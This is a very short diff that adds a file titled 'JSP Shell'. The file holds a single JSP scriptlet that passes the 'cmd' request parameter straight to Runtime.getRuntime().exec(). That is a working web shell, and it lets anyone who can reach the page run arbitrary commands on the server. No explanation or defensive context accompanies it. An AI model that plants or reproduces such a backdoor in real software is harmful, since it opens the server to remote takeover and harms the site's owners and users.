@@ -1,0 +1,4 @@
+#JSP Shell
+
+
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
